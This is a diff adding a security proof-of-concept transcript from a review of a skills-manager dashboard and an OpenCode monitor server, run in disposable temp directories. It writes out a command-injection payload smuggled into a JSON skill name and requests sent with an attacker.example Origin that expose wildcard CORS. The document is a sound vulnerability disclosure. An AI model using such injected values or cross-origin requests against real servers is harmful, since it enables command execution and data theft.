@@ -1,0 +1,38 @@
+Heverton #176 isolated behavior/security POC transcript — 2026-11-23
+
+These HTTP calls were issued by Python urllib with an external Origin header, not a real browser. All data, npx shim, command-injection marker and JSONL event were confined to disposable temp directories. No real npx, OpenCode server, user event, or session was contacted.
+
+1) Skills Manager dashboard command injection.
+Command launched: rtk proxy node /Users/vincentadamnemessis/Library/Caches/NexusMemory/review-checkouts/nm-review-Heverton-web-skill-manager-20261123/skills-manager/scripts/skill-manager/dashboard-server.mjs --port=43761
+Input: POST /api/toggle; Origin https://attacker.example; JSON skill `demo"; touch /var/folders/62/8__6fhqd5dq7bh2cgp2_75lh0000gn/T/nm-skill-manager-poc-dx6kjkth/injection-marker; #`, active=true. Fake npx shim was first on PATH and only logged arguments; no actual npm package install was possible.
+Observed stdout:
+GET_CONFIG_STATUS=200
+GET_CONFIG_CORS=*
+GET_CONFIG_SKILLS=["demo"]
+POST_TOGGLE_STATUS=200
+POST_TOGGLE_CORS=*
+POST_TOGGLE_BODY={"success": true, "skill": "demo\"; touch /var/folders/62/8__6fhqd5dq7bh2cgp2_75lh0000gn/T/nm-skill-manager-poc-dx6kjkth/injection-marker; #", "active": true, "activeCount": 1}
+INJECTION_MARKER_CREATED=True
+FAKE_NPX_LOG='skills add demo\n'
+SERVER_STDERR=''
+Exit: 0. Server temp cwd: /var/folders/62/8__6fhqd5dq7bh2cgp2_75lh0000gn/T/nm-skill-manager-poc-dx6kjkth; marker/config cleaned after POC.
+
+2) OpenCode Monitor event-read CORS check.
+Command launched: rtk proxy node --input-type=module -e <temporary MonitorServer bootstrap>; Host=127.0.0.1; port=58689; OPENCODE_URL=http://127.0.0.1:1 (intentionally refused); data directory contains one synthetic session-fixture JSONL row. Request: GET /api/events; Origin https://attacker.example.
+Observed stdout:
+GET_EVENTS_STATUS=200
+CORS=*
+EVENT_COUNT=1
+SYNTHETIC_DATA_EXPOSED=True
+BODY={"events":[{"id":"evt-1","type":"chat.message","sessionId":"fixture-session","timestamp":1,"text":"synthetic-fixture-only-not-user-data"}],"total":1,"sessionId":"fixture-session"}
+SERVER_STDERR=''
+Exit: 0. No real session or OpenCode service was queried; temp data removed.
+
+3) Skills Manager supported-target probe.
+`getAllIdes()` returned 13 IDs. `generateInstallCommand("codex", ["@owner/demo"], "local")` and the same call for `claude-code` both printed exactly `npx skills add @owner/demo -y`. This indicates the selected target isn't encoded by this adapter layer; downstream npx defaults were not independently verified here.
+
+4) OpenCode Monitor tests.
+Complete literal stdout: see adjacent heverton-opencode-monitor-test.stdout.txt. Command `rtk proxy npm test`, env `OPENCODE_URL=http://127.0.0.1:1`, exit 0; stderr empty; 23 tests, 23 passed, 0 failed.
+
+5) Repository mismatch.
+The Heverton README claims OPENCODE_URL defaults to http://localhost:4096; inspected opencode-monitor/src/cli.js actually defaults to http://localhost:57129. `npm view opencode-monitor` returned 0.2.0 from futpib/opencode-monitor, not this nested subproject (which declares 1.0.0 and no repository URL).
